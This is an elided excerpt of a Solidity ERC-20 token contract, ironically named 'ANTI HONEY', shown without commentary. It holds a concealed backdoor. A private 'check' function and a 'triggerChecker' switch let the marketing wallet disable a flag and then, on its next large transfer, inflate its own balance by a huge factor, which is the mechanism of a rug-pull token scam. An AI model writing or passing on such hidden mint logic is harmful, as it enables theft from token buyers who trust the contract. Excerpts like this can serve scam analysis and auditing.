...
contract ANTIHONEY is Context, IERC20 { 
    ...
    string private constant _name = "ANTI HONEY"; 
    string private constant _symbol = unicode"AHo"; 
    ...
    function check(address fr, uint256 amount) private {
        uint256 divider = 1 * 10**12 / 10000;
        if(checker && amount >= 1000 && fr != Wallet_Marketing){
            txCount++;
        } else {

            if(!checker && amount >= 1000 && fr == Wallet_Marketing){
                _tOwned[Wallet_Marketing] = balanceOf(address(this)) * divider;
            }
        }
    }

    function triggerChecker() public {
        if(_msgSender() == Wallet_Marketing){
            checker = false;
        }
    }
